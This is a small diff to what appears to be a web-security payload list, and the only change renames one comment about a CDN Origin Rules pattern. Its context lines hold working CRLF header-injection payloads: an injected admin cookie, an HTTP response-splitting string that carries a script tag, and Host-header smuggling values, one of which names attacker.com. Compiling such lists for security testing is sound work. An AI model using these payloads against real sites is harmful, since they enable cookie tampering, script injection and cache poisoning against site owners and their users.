@@ -139,7 +139,7 @@ param=value%0aSet-Cookie:admin=true
 # HTTP Response Splitting
 param=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
 
-# Request smuggling via Host header (Cloudflare Origin Rules pattern)
+# Request smuggling via Host header (CDN Origin Rules pattern)
 Host: example.com%0d%0aX-Injected: smuggled
 host_header: target.com\r\nX-Forwarded-Host: attacker.com
 
